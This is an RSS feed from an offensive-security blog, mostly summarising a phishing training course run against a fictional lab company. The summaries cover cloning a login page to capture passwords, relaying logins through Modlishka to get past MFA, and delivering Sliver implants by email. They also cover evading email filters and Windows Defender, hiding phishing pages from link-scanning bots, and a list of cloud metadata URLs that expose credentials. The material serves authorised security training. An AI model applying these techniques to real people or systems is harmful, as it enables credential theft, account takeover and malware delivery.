<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>defektive</title><link>https://defektive.github.io/</link><description>Recent content on defektive</description><generator>Hugo -- gohugo.io</generator><language>en</language><atom:link href="https://defektive.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Firebase</title><link>https://defektive.github.io/docs/domain-takeovers/05-firebase/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/domain-takeovers/05-firebase/</guid><description>Currently, Firebase protects against domain takeovers by requiring each domain to have a unique CNAME or TXT record on the affected domain.</description></item><item><title>Prerequisites</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/05-preqs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/05-preqs/</guid><description>Hopefully this describes you:
Human. Proficient with Linux terminal usage. Manage / edit files in GUIs and terminals. Have a laptop with the following: Ability to run a Linux VM (not required for on site trainings). WiFi card. A web browser. Proficient with docker and docker compose. Desire to learn, sometimes the hard way (eg: troubleshooting). ???</description></item><item><title>Squarespace</title><link>https://defektive.github.io/docs/domain-takeovers/05-squarespace/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/domain-takeovers/05-squarespace/</guid><description>Currently, Squarespace protects against domain takeovers by requiring each domain to have a unique CNAME record on the affected domain.</description></item><item><title>Introduction</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/10-introduction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/10-introduction/</guid><description>Setting the stage for things to come.
We are going to setup phishing infrastructure. Our infrastructure will allow us to: Manage phishing campaigns (Gophish). Send emails (MailHog for testing, ??? for production). Coordinate requests between users and a login provider (Modlishka). Hide from detections / bots. Acquire a CSV of users to target (First Name, Last Name, Email, Role).</description></item><item><title>Infrastructure</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/15.5-infrastructure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/15.5-infrastructure/</guid><description>Skip this section if taking the training. The lab should already have this.
We&amp;rsquo;ll be using a few different VMs throughout this process. Let&amp;rsquo;s kick off the downloads now since they make take some time to complete.
Ubuntu LTS Windows 10 Op VM We need a place to deploy all our stuff. For this workshop, we&amp;rsquo;ll be using VirtualBox and the latest Ubuntu LTS (22.04 LTS). Ubuntu has a great walk through on how to do this.</description></item><item><title>What isn't covered?</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/15-not-covered/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/15-not-covered/</guid><description>These should be considered in real engagements
Domain reputation. Impossible travel detection&amp;rsquo;s. Target acquisition. Lightly covered. Designing target specific campaigns. ??? Probably more&amp;hellip;</description></item><item><title>Lab Environment</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/16-lab-connect/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/16-lab-connect/</guid><description>This is for onsite training. Skip this section if not taking training.
Connect to the lab network Connecting to the lab environment.
WiFi Name: SaintConPhishingTraining WiFi_Pass: I can haz teh phish now? Sign in to the lab environment Once connected to the Wi-Fi, open the lab environment URL.
https://console.lab.dfktv:8443/#/
Use your supplied credentials to login.
You should see two VM connections waiting for you.
Success! Welcome to the SAINTCON Phishing Security team!</description></item><item><title>Lab Environment: Rules of Engagement</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/16.5-roe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/16.5-roe/</guid><description>This is for onsite training. Skip this section if not taking training.
SAINTCON Phishing has been tasked to perform a penetration test against SnakShare&amp;rsquo;s information systems and employees. SnakShare recently implemented new email security protections.
Scope snakshare.com and any subdomains mail.snakshare.com auth.snakshare.com Rules of Engagement Target email addresses will NOT be supplied. Test Plan Effektive Ops will conduct the following.
Perform OSINT against SnakShare. Compile a list of potential SnakShare employees and email addresses.</description></item><item><title>Setup Operations Directory</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/20-setup-op-dir/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/20-setup-op-dir/</guid><description>We need a nice place to organize and store everything. For this exercise, we&amp;rsquo;ll use ~/Desktop/op. We&amp;rsquo;ll also need a docker directory to put our docker configuration in.
mkdir -p ~/Desktop/op/docker touch ~/Desktop/op/docker/docker-compose.yml</description></item><item><title>OSINT</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/24-osint/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/24-osint/</guid><description>It is time to perform OSINT on our target&amp;hellip;.
host snakshare.com We should see something like this.
âžœ ~ host snakshare.com snakshare.com has address 162.255.119.59 snakshare.com mail is handled by 10 eforward3.registrar-servers.com. snakshare.com mail is handled by 20 eforward5.registrar-servers.com. snakshare.com mail is handled by 15 eforward4.registrar-servers.com. snakshare.com mail is handled by 10 eforward1.registrar-servers.com. snakshare.com mail is handled by 10 eforward2.registrar-servers.com. I like to do a reverse host look up.
host 162.</description></item><item><title>Mailhog</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/25-mailhog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/25-mailhog/</guid><description>MailHog is an SMTP server used for testing various applications that send emails. It provides a simple web interface to view what messages have been sent. Let&amp;rsquo;s edit our new ~/Desktop/op/docker/docker-compose.yml file and add the following to configure MailHog.
version: &amp;#34;3&amp;#34; services: mailhog: image: mailhog/mailhog container_name: mailhog environment: - VIRTUAL_HOST=mailhog.docker logging: driver: &amp;#39;none&amp;#39; # disable saving logs Now we should be able to bring up our docker compose environment to test that it is working.</description></item><item><title>Gophish</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/30-gophish/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/30-gophish/</guid><description>Gophish Let&amp;rsquo;s create a file for our Gophish configuration:
mkdir -p ~/Desktop/op/docker/gophish touch ~/Desktop/op/docker/gophish/config.json { &amp;#34;admin_server&amp;#34;: { &amp;#34;listen_url&amp;#34;: &amp;#34;0.0.0.0:3333&amp;#34;, &amp;#34;use_tls&amp;#34;: false, &amp;#34;cert_path&amp;#34;: &amp;#34;gophish_admin.crt&amp;#34;, &amp;#34;key_path&amp;#34;: &amp;#34;gophish_admin.key&amp;#34;, &amp;#34;trusted_origins&amp;#34;: [] }, &amp;#34;phish_server&amp;#34;: { &amp;#34;listen_url&amp;#34;: &amp;#34;0.0.0.0:80&amp;#34;, &amp;#34;use_tls&amp;#34;: false, &amp;#34;cert_path&amp;#34;: &amp;#34;example.crt&amp;#34;, &amp;#34;key_path&amp;#34;: &amp;#34;example.key&amp;#34; }, &amp;#34;db_name&amp;#34;: &amp;#34;sqlite3&amp;#34;, &amp;#34;db_path&amp;#34;: &amp;#34;gophish.db&amp;#34;, &amp;#34;migrations_prefix&amp;#34;: &amp;#34;db/db_&amp;#34;, &amp;#34;contact_address&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;logging&amp;#34;: { &amp;#34;filename&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;level&amp;#34;: &amp;#34;&amp;#34; } } Now we can add Gophish to our docker-compose services.
gophish: image: gophish/gophish container_name: &amp;#34;gophish&amp;#34; environment: - VIRTUAL_HOST=gophish.</description></item><item><title>Target Acquisition</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/31-target-aquistion/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/31-target-aquistion/</guid><description>Where can we acquire targets?
LinkedIn Pros Useful job role information. Usually up to date. Cons Most likely violates LinkedIn policy if automated. Automation is brittle and requires updates when changes are made. Breach Dumps Pros Could find valid passwords. Confirm email address formatting. cool services like Dehashed mean you don&amp;rsquo;t have to maintain the data. Cons Outdated. Lots of data. Source Control Pros Easy to get. Commit dates give an idea at how recently the information was valid.</description></item><item><title>Target Acquisition: Git</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/32-target-aquistion-git/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/32-target-aquistion-git/</guid><description>Go to GitHub and see what we can find. Open https://github.com/snakshare.
mkdir -p ~/Desktop/op/code/github.com/snakshare cd ~/Desktop/op/code/github.com/snakshare git clone https://github.com/SnakShare/snakshare.github.io.git Now we can get a list of users and email addresses.
git log --pretty=&amp;#34;format:%aN, %ae%n%cN, %ce&amp;#34; | sort -u | tee ~/Desktop/op/git-users.csv</description></item><item><title>Basic Credential Harvesting</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/35-basic-cred-harvest/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/35-basic-cred-harvest/</guid><description>Create a new landing page. open https://someplace.okta.com/ open dev console (f12) in console run: let s = document.getElementsByTagName(&amp;#39;script&amp;#39;); while (s[0]) { s[0].parentNode.removeChild(s[0])} right click web page &amp;gt; inspect element. find top HTML tag. right click &amp;gt; copy &amp;gt; outer HTML. paste HTML in landing page. check capture data. check capture password. set redirect to https://www.okta.com/404.html Create a new email template Be sure to include {{.URL}} ref
Name: Basic credential Harvesting Envelope Sender: guy@target.</description></item><item><title>State Review I</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/40-state-review-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/40-state-review-1/</guid><description>This current setup would allow you to do basic credential harvesting phishing campaigns. Which may work on some organizations. However, Many modern organizations usually have additional protections. The following protections are standard security practices:
Require MFA. Email filtering (though most services provide a basic filter). Email link protections (fancy bots to analyze link content before allowing users to visit the URL). Domain monitoring (Certificate transparency logs for look alike domains). Endpoint Protections.</description></item><item><title>Implant Setup With Sliver</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/45-implant-setup/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/45-implant-setup/</guid><description>Basic Payload Delivery: Sliver Sliver is an open source C2
https://github.com/BishopFox/sliver/wiki/Getting-Started https://github.com/BishopFox/sliver/releases Download the latest release and put in your $PATH. We should already have our dependencies installed when we set up the infrastructure.
mkdir ~/bin wget -O ~/bin/sliver-server_linux https://github.com/BishopFox/sliver/releases/download/v1.5.41/sliver-server_linux chmod +x ~/bin/sliver-server_linux</description></item><item><title>Sliver: Generating an implant</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/50-generating-sliver-implant/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/50-generating-sliver-implant/</guid><description>Generate a new implant mkdir -p ~/Desktop/op/sliver/implants cd ~/Desktop/op/sliver sliver-server_linux We should now be in a sliver shell.
Now we can generate a test implant:
generate --mtls 127.0.0.1 --save implants/default-sliver.exe Testing implant In the sliver shell:
mtls In a new terminal window:
wine ~/Desktop/op/sliver/implants/default-sliver.exe Now we can use the implant by calling use [session id]:</description></item><item><title>Basic Implant Delivery</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/55-basic-implant-delivery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/55-basic-implant-delivery/</guid><description> Copy first template. Add file attachment. Update words. Create new Campaign that uses the above. The landing page can stay the same, it is actually not used since we removed it from the template. wait for the email to send&amp;hellip; The default sliver executable is ~15MB so it may take sometime for it to send&amp;hellip;. You can find the attachment under the MIME tab.</description></item><item><title>State Review II</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/60-state-review-ii/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/60-state-review-ii/</guid><description>How can we make this better? We need:
Intercept MFA requests. We are already tricking the user to visiting our site, so this is easier than it sounds. Use invisible HTML tags to bypass email filtering. Detect bots and show them benign pages. Ensure our domains do not match the target or prominent service provider. Obfuscate payloads to bypass EDR protections.</description></item><item><title>Modlishka</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/65-modlishka/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/65-modlishka/</guid><description>Modlishka Modlishka is an amazing tool that can mirror a website on the fly, rewriting links to ensure the site functions. This allows us to essentially MitM connections to our targeted service from a domain we control.
Checkout of Modlishka and get things setup to be run in docker.
mkdir ~/Desktop/op/docker/modlishka cd ~/Desktop/op/docker/modlishka mkdir modlishka-data touch modlishka-data/config.json git clone https://github.com/Stage2Sec/Modlishka.git cd Modlishka cp extra/docker/* . Modlishka can take command line arguments or a configuration file.</description></item><item><title>Setup MFA Authentication Provider</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/70-modlishka-sso/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/70-modlishka-sso/</guid><description>If attending a live training, skip this section
Now that we have Modlishka up and running. Let&amp;rsquo;s get it configured with a target login provider. We&amp;rsquo;ll use Authentik to get an Okta like experience.
mkdir ~/Desktop/op/docker/authentik cd ~/Desktop/op/docker/ echo &amp;#34;PG_PASS=dumbpassword&amp;#34; &amp;gt;&amp;gt; .env echo &amp;#34;AUTHENTIK_SECRET_KEY=supersecretkeythatpaullikes&amp;#34; &amp;gt;&amp;gt; .env echo &amp;#34;AUTHENTIK_ERROR_REPORTING__ENABLED=true&amp;#34; &amp;gt;&amp;gt; .env Add the follow for emails&amp;hellip;
# SMTP Host Emails are sent to AUTHENTIK_EMAIL__HOST=mailhog AUTHENTIK_EMAIL__PORT=1025 # Optionally authenticate (don&amp;#39;t add quotation marks to your password) AUTHENTIK_EMAIL__USERNAME= AUTHENTIK_EMAIL__PASSWORD= # Use StartTLS AUTHENTIK_EMAIL__USE_TLS=false # Use SSL AUTHENTIK_EMAIL__USE_SSL=false AUTHENTIK_EMAIL__TIMEOUT=10 # Email address authentik will send from, should have a correct @domain AUTHENTIK_EMAIL__FROM=authentik@target.</description></item><item><title>Reconfigure Modlishka With MFA Authentication Provider</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/75-reconfigure-modlishka/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/75-reconfigure-modlishka/</guid><description>Let&amp;rsquo;s go through the authentication flow to determine what the username and password fields when conducting a normal login. First thing we want to do is open developer tools and ensure Persist Logs is checked.
Now we can fill out the username field, press login, then look for the POST request.
Fill out our password and do the same.
We can see that the fields are uid_field and password.
Now we need to find a URL path that is only hit when the target successfully logs in.</description></item><item><title>Test Modlishka MFA Bypass</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/80-testing-modlishka-mfa-bypass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/80-testing-modlishka-mfa-bypass/</guid><description>Open up a new private browsing window, then visit http://modlishka.docker/?rid=test0001. We&amp;rsquo;ll make up a fake rid value to help us track our progress.
Go through the authentication flow. You can Modlishka seamlessly handles the redirects and the MFA authentication flow.
So we are stuck at a loading screen. this is because we hit the terminate trigger URL while loading a page.
If we refresh the page we&amp;rsquo;ll get redirected to our termination URL.</description></item><item><title>Not So Basic Credential Harvesting</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/85-not-so-basic-phishing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/85-not-so-basic-phishing/</guid><description>Now we can go back to Gophish, clone our first credential harvesting campaign, modify the URL to point to Modlishka (http://modlishka.docker).
This will break Gophish&amp;rsquo;s Opened, Clicked, and Data Captured analytics. We can fix those later, but for now we&amp;rsquo;ll just keep moving forward.
If we click on it, we can see in our Modlishka livewell page, we can see our target&amp;rsquo;s RID.
Feel free to go through the whole flow.</description></item><item><title>Email Filtering Bypass</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/100-email-filtering-bypass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/100-email-filtering-bypass/</guid><description>Bypassing Email Filtering A lot of times emails will be quarantined based on content. We can trick them by injecting invisible characters and html elements into our messages.
We can use a Zero Width Joiner ref to assist in this. simply pasting the character in the middle of problematic words should do the trick.
We can also use the &amp;lt;span&amp;gt; HTML element to help us out by breaking up problematic words and phrases.</description></item><item><title>Modlishka Terminate to Implant Download</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/105-terminate-to-implant-download/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/105-terminate-to-implant-download/</guid><description>Terminate to implant download We can set our terminationURL to a place where we are hosting our windows implant. This will require them to authenticate then be redirected to a file download page.
Add our newly generated payload to the NGINX container.
Create a landing page html to be our termination URL. We can use this to execute some js to make sure the target is running windows before we download the file.</description></item><item><title>Better Payload Generation</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/110-better-payload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/110-better-payload/</guid><description>Better implants (frostbyte bypass windows defender) Instead of generating an executable. We can generate shellcode. We can then use something like https://github.com/pwn1sher/frostbyte to load that shellcode into memory and execute it.
Get frostbyte Download the frostbyte zip from GitHub.
Generate shellcode In a sliver shell we need to run the following to generate some shellcode to be used later. We&amp;rsquo;ll use test.example as the callback domain, we will add an entry to the Windows hosts file.</description></item><item><title>Bot Detection</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/120-bot-detection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/120-bot-detection/</guid><description>What are bots? Bots are usually headless browsers that visit links in email and analyze them for threats. This includes looking for logins, especially popular ones that are not on the correct domain. We need a reliable way to determine if a request is coming from a real user or a bot.
How can we detect bots? To do this we can use javascript to inspect the browser that is visiting our page.</description></item><item><title>Traefik Reverse Proxy</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/125-traefik-reverse-proxy/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/125-traefik-reverse-proxy/</guid><description>Traefik Reverse Proxy Now that we have a reliable way to detect bots, we need to be able to make that determination before showing the phishing page. Then we can show bots simple non-malicious content and users will get our phishing pages. We can do this using traefik to route requests based on cookies. We can put traefik in front of Modlishka and force all request to go through a simple bot check before loading our phishing site.</description></item><item><title>Wrap up</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/200-wrap-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/200-wrap-up/</guid><description>THIS IS A ROUGH OUTLINE OF WHAT NEEDS TO BE FINISHED
What needs to change for live assessments Now we have a decent understanding of our current capabilities. How can we successfully execute this for reals?
We need the following:
A domain to send emails from. A domain to host malicious content. Could be the same, but it&amp;rsquo;s nice have them separate in case one is burned. TLS Certs. A target and their permission.</description></item><item><title>Packer, Ubuntu Noble, and VirtualBox</title><link>https://defektive.github.io/blog/2024/08/31/packer-ubuntu-noble-and-virtualbox/</link><pubDate>Sat, 31 Aug 2024 00:00:00 +0000</pubDate><guid>https://defektive.github.io/blog/2024/08/31/packer-ubuntu-noble-and-virtualbox/</guid><description>I have been using Packer for quite a while. However, all my interactions have used JSON instead of HCL. I wanted to set up a new build using HCL, VirtualBox, and Ubuntu 24.04. I am going to attempt to create documentation for using HCL with VirtualBox to build a custom image based on the latest Ubuntu LTS release (with cloud init).
In my research I found some decent guides that did most of what I wanted.</description></item><item><title>Adopting Docsy Theme</title><link>https://defektive.github.io/blog/2024/08/27/adopting-docsy-theme/</link><pubDate>Tue, 27 Aug 2024 00:00:00 +0000</pubDate><guid>https://defektive.github.io/blog/2024/08/27/adopting-docsy-theme/</guid><description>I recently (not that recent) discovered the Docsy theme for Hugo. After playing with it on a few mini projects, I have decided to migrate this site to use it. I imagine I will slowly start migrating other things to it as well.</description></item><item><title>Curl Resolve DNS through Proxy</title><link>https://defektive.github.io/blog/2021/02/17/curl-resolve-dns-through-proxy/</link><pubDate>Wed, 17 Feb 2021 12:20:01 +0000</pubDate><guid>https://defektive.github.io/blog/2021/02/17/curl-resolve-dns-through-proxy/</guid><description>If you append h to your socks5 protocol prefix when using --proxy the DNS resolution happens on the other side of the socks proxy!
curl --proxy socks5h://127.0.0.1:1080 http://internal-host</description></item><item><title>Cloud metadata URLs</title><link>https://defektive.github.io/blog/2020/01/30/cloud-metadata-urls/</link><pubDate>Thu, 30 Jan 2020 16:20:01 +0000</pubDate><guid>https://defektive.github.io/blog/2020/01/30/cloud-metadata-urls/</guid><description>Alibaba http://100.100.100.200/latest/meta-data/ http://100.100.100.200/latest/meta-data/instance-id http://100.100.100.200/latest/meta-data/image-id References
https://www.alibabacloud.com/help/faq-detail/49122.htm AWS http://169.254.169.254/latest/user-data http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] http://169.254.169.254/latest/meta-data/ami-id http://169.254.169.254/latest/meta-data/reservation-id http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key http://169.254.169.254/ http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/public-keys/ ECS Task http://169.254.170.2/v2/credentials/ References
http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html Azure No header Required http://169.254.169.254/metadata/v1/maintenance Requires header Must use Metadata: true request header
http://169.254.169.254/metadata/instance?api-version=2017-04-02 http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&amp;amp;format=text References
https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/ https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service Google Cloud Requires header Must use one of the following headers
Metadata-Flavor: Google X-Google-Metadata-Request: True http://169.254.169.254/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/ http://metadata/computeMetadata/v1/ http://metadata.google.internal/computeMetadata/v1/instance/hostname http://metadata.google.internal/computeMetadata/v1/instance/id http://metadata.google.internal/computeMetadata/v1/project/project-id http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true No header required (old) http://metadata.</description></item><item><title>About Defektive</title><link>https://defektive.github.io/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/about/</guid><description>About Me Offensive Security / Developer Twenty years ago I began learning to program in order to learn how to break programs. I have been building and breaking ever since. I love learning new things, writing code, and sharing my passion for security. This makes finding and exploiting software vulnerabilities extremely rewarding for me. I take pride in clean code, even if it is exploit code.
Professionally, I lead a small team of talented penetration testers.</description></item><item><title>Search Results</title><link>https://defektive.github.io/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/search/</guid><description/></item></channel></rss>